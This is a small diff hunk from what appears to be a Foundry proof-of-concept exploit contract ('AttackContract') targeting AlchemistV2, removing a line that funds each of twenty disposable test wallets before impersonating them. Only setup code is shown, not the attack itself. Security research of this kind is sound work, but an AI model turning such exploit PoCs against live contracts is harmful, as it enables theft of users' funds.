@@ -68,7 +68,6 @@ contract AttackContract is PoC {
         for(uint8 i = 1; i <= 20; i++) {
             console.log("---------- New account: %i ----------", i);
             address disposableAddress = vm.createWallet(i).addr;
-            deal(EthereumTokens.NATIVE_ASSET, disposableAddress, 0x1000000000000000000);
             vm.startPrank(disposableAddress, disposableAddress);
 
             AlchemistV2.YieldTokenParams memory yieldTokenParameters;
